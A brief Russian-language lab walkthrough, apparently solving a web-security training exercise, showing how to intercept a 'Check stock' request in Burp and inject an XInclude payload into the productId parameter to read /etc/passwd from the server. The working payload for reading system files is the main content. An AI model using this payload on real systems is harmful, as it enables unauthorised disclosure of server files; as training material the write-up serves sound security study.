## Exploiting XInclude to retrieve files
1. Находим что фича "Check stock" находится на странице товара
2. Смотрим запрос через burp, видим там в теле передачу параметров `productId=1&storeId=1`
3. Меняем параметры на `productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1`
4. Готово.